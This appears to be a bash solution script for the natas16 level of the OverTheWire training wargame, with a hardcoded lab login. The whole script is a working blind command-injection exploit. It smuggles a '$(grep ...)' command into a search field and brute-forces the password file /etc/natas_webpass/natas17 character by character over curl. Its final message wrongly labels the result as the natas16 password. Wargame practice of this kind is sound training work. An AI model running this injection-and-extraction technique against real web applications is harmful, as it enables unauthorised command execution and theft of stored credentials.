#!/bin/bash

CHARS="bhjkoqsvwCEFHJLNOT05789"
URL="natas16.natas.labs.overthewire.org"
LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS="E"
PASS_LEN=31


for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		TMP=$PASS
		TMP+=$char
		OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $TMP /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
		if [ "$OUT" -eq 0 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas16: $PASS"
	
